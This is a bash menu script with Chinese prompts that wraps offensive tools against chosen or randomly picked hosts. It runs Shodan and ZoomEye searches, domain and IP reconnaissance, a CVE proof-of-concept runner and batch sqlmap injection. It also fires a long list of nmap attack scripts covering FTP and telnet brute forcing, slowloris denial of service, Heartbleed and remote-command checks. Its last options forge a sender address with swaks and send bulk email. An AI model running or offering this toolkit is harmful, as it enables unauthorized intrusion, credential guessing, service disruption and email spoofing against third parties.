#!/bin/bash
echo "
                  ##     ##    #########                
                    ##  ##     ##
                     ###       #######  
                    ## ##      ## 
                  ##    ##     ##


1.根据服务和端口随机查询IP(三款搜索引擎censys,shodan,zoomeye需要key)
2.域名信息收集
3.IP信息收集(nmap)
4.cve检测
5.批量sql注入检测
6.漏洞检测
7.邮箱伪造
8.批量发送邮件
"
echo "输入序号"
read a

if [ "$a" = "1" ];then
     nmap -iR 500 -P 80 --open -o outip.txt
     
     echo "输入查询的服务 如:webcam" 
     read b
     python3 zoomeye-search/zoomeye.py -q "$b"
     echo "已经存入results.txt"
     sleep 3;
     clear
     sudo python shodan/search.py
     ./xf.sh
     
else 
     if [ "$a" = "2" ];then
     echo "请输入域名:(如www.xhu.edu.cn)"
     read c

     whois $c
     
     nslookup $c

     dig @8.8.8.8 $c any
     
     dig txt chaos VERSION.BIND @
     
     echo "输入dns服务器名"

     read m

     echo "dns版本探测"

     dig txt chaos VERSION.BIND @$m

     fierce -dns $c -threads 3

     dirb http://$c

     dirb https://$c
     
     ./xf.sh
else 
     if [ "$a" = "3" ];then
     echo "请输入ip:"
     read d
     nmap -T4 -A $d
     whois $d
     nslookup $d
     dig @8.8.8.8 $d any
     fierce -dns $d -threads
     ./xf.sh
else 
     if [ "$a" = "4" ];then
     echo "检测中..."
     python3 poc.py
     ./xf.sh

else
     if [ "$a" = "5" ];then
     echo "导入注入链接到sqlmap.txt"
     sqlmap -m sqlmap.txt --batch --smart
     echo "ok"
     ./xf.sh

else
     if [ "$a" = "6" ];then
     echo "输入ip and 域名"
     read f
     nmap --script=vuln $f

     nmap --max-parallelism 800--script http-slowloris $f

     nmap -p 8080 --script http-iis-short-name-brute $f

     nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 $f

     nmap -T2 --script ftp-vsftpd-backdoor $f

     nmap -T3 --script http-methods --script-args http.test-all=true,http.url-path=/ $f

     nmap -sV --script http-vuln-cve2015-1635 $f

     nmap -sV -p 443 --version-light --script ssl-poodle $f

     nmap --script mysql-empty-password $f
     
     nmap --script http-vuln-cve2015-1427 --script-args command=ls $f

     nmap -Pn --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd=dir,http-vuln-cve2014-8877.uri=/wordpress $f

     nmap --script sshv1,sslv2 $f
    
     nmap -Pn --script ssl-ccs-injection $f

     nmap -v -v --script ssl-cert $f

     nmap -p 443 --script ssl-heartbleed,ssl-known-key  $f

     nmap -p 443 --script ssl-known-key $f

     nmap --script ssl-enum-ciphers $f

     nmap --script ssl-dh-params  $f

     nmap $f --vv --script sshv1,ssl-ccs-injection,ssl-cert,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-google-cert-catalog,ssl-heartbleed,ssl-known-key,sslv2

     nmap --script sniffer-detect $f

     nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst --script-args telnet-brute.timeout=8s $f

     nmap -sV --script unusual-port $f
 
     nmap --script vnc-info  $f

     nmap --script brute $f

     nmap --script discovery $f 

     nmap --script exploit $f

     nmap --script external $f

     nmap --script fuzzer  $f

     nmap --script malware $f

     nmap --script safe $f

     nmap --script vuln $f

    ./xf.sh
else 
    if [ "$a" = "7" ];then
    echo "输入标题(text)"
    read p
    echo "输入发件内容"
    read o
    echo "输入伪造邮箱的地址(hack@xdf.com)"
    read k
    echo "输入收件人"
    read j

    swaks --body "$o" --header "Subject:$p" -t $j -f "$k"
else
    if [ "$a" = "8" ];then
    echo "请把收件人放入gmail.txt"
    chmod +x gmail.sh
    ./gmail.sh gmail.txt
    ./xf.sh
else
    echo "请输入上面的序号"       
    sleep 2;
    clear
    ./xf.sh


fi
fi
fi
fi
fi
fi
fi
fi
fi





